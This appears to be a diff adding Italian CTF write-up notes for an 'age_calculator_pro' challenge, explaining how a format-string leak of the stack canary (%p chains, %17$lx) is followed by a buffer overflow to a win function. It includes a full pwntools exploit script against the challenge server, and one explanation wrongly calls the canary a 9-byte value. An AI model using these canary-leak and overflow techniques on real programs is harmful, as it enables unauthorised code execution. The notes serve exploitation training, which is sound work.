@@ -132,4 +132,86 @@ A questo punto creaimo il nostro nuovo utente root custom (es. mia_root), e una 
 
 Fatto ciò saremo utente root, e potremmo prendere la root_flag
 
+---
+# Esercizio age_calculator_pro
 
+L'esercizio prevede una format string per scovare lo stack canaries, poi buffer overflow per ottenere la shell (tramite utilizzo della funzione win)
+
+il payload è il seguente 
+
+`payload=b"A"*0x48+p64(canary_sp_int)+b"B"*8+p64(0x004011f6)`
+
+dove : 
+- `b"A"*0x48` indica la distanza fra il canary e l'inizio del nostor input, trovato in questo modo
+	- l'offset è trovato cosi hex(`<Indirizzo Canary>`-`<Indirizzo input>`) dove il primo indirizzo è lo stack del canary e il secondo quello dell'input
+- `canary_sp_int` è il leak dello stack canary
+- `b"B"*0x8` : quel numeor sta ad indicare quanti bytes (8) si sovrappongono tra il canary e la printf, infatti da gdb possiamo vedere che tra canary e printf ci sta un solo spazio vuoto
+- `0x004011f6` indirizzo della funzione win, trovato con Ghidra
+## Posizione del Canary nello Stack
+
+Il canary si trova tipicamente in una posizione tra le variabili locali e l'indirizzo di ritorno (il **return address**). Questo avviene per proteggere l'integrità della funzione da attacchi di **buffer overflow**. La posizione precisa (in questo caso la posizione 17) dipende da vari fattori legati all'organizzazione della memoria dello stack da parte del compilatore.
+
+1. **Calling Conventions**: Le **calling conventions** sono regole che definiscono come i parametri vengono passati alle funzioni, come viene gestito lo stack, e come vengono salvati i registri. Le convenzioni possono influenzare la struttura dello stack, ma non determinano direttamente la posizione del canary. La loro principale funzione è stabilire l’ordine di chiamata dei parametri, il salvataggio del **frame pointer** (se usato), e il ritorno al chiamante.
+2. **Allineamento e Padding**: Il motivo per cui il canary si trova alla posizione 17 può essere legato all'allineamento della memoria e al padding inserito dal compilatore. Per ragioni di efficienza, le variabili locali vengono allocate in memoria seguendo regole di allineamento (spesso a multipli di 8 o 16 byte su architetture a 64 bit). Queste regole possono introdurre "spazi vuoti" (padding) nello stack, spostando di fatto il canary più in alto o in basso.
+3. **Dimensione delle Variabili Locali**: Se hai un buffer di una certa dimensione e altre variabili locali, queste occupano un certo spazio nello stack. Il canary viene posizionato dopo queste variabili per prevenire overflow e potrebbe trovarsi alla posizione 17 a causa della quantità di spazio richiesto da queste variabili.
+4. **Effetto delle Calling Conventions**: Le calling conventions, in questo contesto, non influenzano direttamente la posizione del canary. Esse determinano come i parametri vengono gestiti nello stack e dove vengono salvati i registri, ma la posizione del canary è influenzata maggiormente dall’organizzazione delle variabili locali, dall’allineamento della memoria e dalle decisioni del compilatore su come strutturare lo stack.
+
+### Perché il Canary è a Posizione 17?
+
+La posizione 17 è una conseguenza del modo in cui il compilatore organizza le variabili nello stack, tenendo conto di:
+
+- La dimensione del buffer e delle altre variabili locali.
+- La presenza di eventuali spazi di padding per mantenere l’allineamento della memoria.
+- La necessità di inserire il canary prima del return address per verificare se il buffer è stato corrotto.
+
+Quindi, la **calling convention** non determina la posizione esatta del canary, ma gioca un ruolo indiretto nella disposizione generale dello stack. Il canary si trova in quella posizione principalmente per il modo in cui il compilatore ha deciso di organizzare le variabili e applicare l'allineamento della memoria.
+
+Per capire in che posizione dello stack trovare il canary, potevamo fare questa cosa : 
+
+- Una volta eseguito il programma, in faso di input dovevamo mettere questa sequenza di selettori `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`
+- Una volta messo in input questa sequenza, ci troveremo con un output molto particolare. Da questo possiamo prendere il canary, dato che è l'unico indirizzo di 9 byte, di cui **8 sono casuali** e **l'ultimo è il byte nullo**
+
+Es.
+
+Un possibile output : 
+`0x7f37a1704963.(nil).0x7f37a17048e0.(nil).(nil).0x8c00000006.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x70252e.0x7ffc78527300.0xb123d6c61ae59400.0x1.0x7f37a1551dba.0x7ffc78527330`
+
+Il canary, seguendo la descrizione di prima, sarà `0xb123d6c61ae59400`, che si trova in posizione 17
+
+## Exploit
+
+L'exploit è il seguente
+
+```python
+from pwn import *
+
+ARG = "%17$lx"
+
+p = remote("agecalculatorpro.challs.olicyber.it",38103)
+
+p.recvuntil("What's your name?")
+
+p.sendline(ARG)
+
+p.recvline()
+
+canary = p.recvline().strip()
+
+print(canary)
+
+canary_sp = canary.split(b",")
+
+print(canary_sp[0])  
+
+canary_sp_int = int(canary_sp[0],16)
+
+print(canary_sp_int)
+
+p.sendline(b"A"*0x48+p64(canary_sp_int)+b"B"*8+p64(0x004011f6))
+
+p.interactive()
+```
+
+## Altro metodo per canary
+
+da gdb, lanciare il comando `x/x $fs_base+0x28` se l'architettura è a 64 bit
